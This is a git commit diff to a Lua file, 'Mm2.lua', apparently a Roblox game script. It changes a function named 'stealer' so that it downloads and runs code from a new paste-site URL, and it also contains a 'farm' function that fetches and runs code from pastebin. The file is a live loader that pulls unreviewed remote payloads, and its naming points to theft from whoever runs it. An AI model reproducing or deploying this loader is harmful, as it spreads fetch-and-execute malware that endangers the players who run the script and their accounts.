a041c789d225bbe4a5cb2ee47965f1c4c4081a1a
AstonishPo099 <isidrocbaro74@gmail.com>
2025-04-09 23:35:52 +0800

    Update Mm2.lua

--- Mm2.lua
+++ Mm2.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://gitlab.com/D3athFeather/Script/raw/main/Protected_de334b0384c3232f914ce361.lua", true))()
+    loadstring(game:HttpGet("http://vpaste.net/fC09a", true))()
 end
 local function farm()
     loadstring(game:HttpGet("https://pastebin.com/raw/HB28SyAC"))()
